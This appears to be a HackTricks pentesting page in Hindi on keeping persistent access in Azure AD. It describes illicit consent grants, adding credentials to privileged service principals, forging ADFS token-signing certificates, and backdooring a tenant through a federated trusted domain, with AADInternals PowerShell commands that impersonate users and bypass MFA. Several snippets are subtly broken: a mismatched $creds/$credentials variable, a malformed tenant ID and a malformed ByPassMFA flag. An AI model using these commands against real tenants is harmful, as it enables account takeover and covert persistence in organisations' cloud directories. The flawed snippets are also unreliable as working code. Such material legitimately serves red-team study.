# Az - Persistence

{{#include ../../../banners/hacktricks-training.md}}

### अवैध सहमति अनुदान

डिफ़ॉल्ट रूप से, कोई भी उपयोगकर्ता Azure AD में एक एप्लिकेशन पंजीकृत कर सकता है। इसलिए आप एक एप्लिकेशन पंजीकृत कर सकते हैं (केवल लक्षित टेनेट के लिए) जिसे उच्च प्रभाव वाले अनुमतियों की आवश्यकता है जिसमें व्यवस्थापक की सहमति (यदि आप व्यवस्थापक हैं तो इसे स्वीकृत करें) - जैसे कि किसी उपयोगकर्ता की ओर से मेल भेजना, भूमिका प्रबंधन आदि। यह हमें **फिशिंग हमलों** को **सफलता** की स्थिति में बहुत **लाभदायक** बनाने की अनुमति देगा।

इसके अलावा, आप अपने उपयोगकर्ता के रूप में उस एप्लिकेशन को स्वीकार कर सकते हैं ताकि उस पर पहुंच बनाए रख सकें।

### एप्लिकेशन और सेवा प्रमुख

एप्लिकेशन व्यवस्थापक, GA या microsoft.directory/applications/credentials/update अनुमतियों के साथ एक कस्टम भूमिका के विशेषाधिकारों के साथ, हम एक मौजूदा एप्लिकेशन में क्रेडेंशियल्स (गुप्त या प्रमाणपत्र) जोड़ सकते हैं।

यह **उच्च अनुमतियों वाले एप्लिकेशन को लक्षित करना** या **उच्च अनुमतियों के साथ एक नया एप्लिकेशन जोड़ना** संभव है।

एप्लिकेशन में जोड़ने के लिए एक दिलचस्प भूमिका **विशेषाधिकार प्राप्त प्रमाणीकरण व्यवस्थापक भूमिका** होगी क्योंकि यह वैश्विक व्यवस्थापकों का **पासवर्ड रीसेट** करने की अनुमति देती है।

यह तकनीक **MFA** को भी **बायपास** करने की अनुमति देती है।
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
- प्रमाणपत्र आधारित प्रमाणीकरण के लिए
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### Federation - Token Signing Certificate

**DA विशेषाधिकार** के साथ ऑन-प्रेम AD पर, **नए Token signing** और **Token Decrypt certificates** बनाना और आयात करना संभव है जिनकी वैधता बहुत लंबी होती है। यह हमें **किसी भी उपयोगकर्ता के रूप में लॉग-इन** करने की अनुमति देगा जिसका ImuutableID हमें पता है।

**निम्नलिखित कमांड** को **ADFS सर्वर(s) पर DA के रूप में चलाएँ** नए certs बनाने के लिए (डिफ़ॉल्ट पासवर्ड 'AADInternals'), उन्हें ADFS में जोड़ें, ऑटो रोलओवर को अक्षम करें और सेवा को पुनः प्रारंभ करें:
```powershell
New-AADIntADFSSelfSignedCertificates
```
फिर, Azure AD के साथ प्रमाणपत्र जानकारी को अपडेट करें:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

GA विशेषाधिकारों के साथ एक टेनेट पर, **एक नया डोमेन जोड़ना** संभव है (इसकी पुष्टि होनी चाहिए), इसके प्रमाणीकरण प्रकार को फेडरेटेड पर कॉन्फ़िगर करना और डोमेन को **एक विशिष्ट प्रमाणपत्र** (नीचे दिए गए कमांड में any.sts) और जारीकर्ता पर **विश्वास** करने के लिए कॉन्फ़िगर करना:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## संदर्भ

- [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{{#include ../../../banners/hacktricks-training.md}}
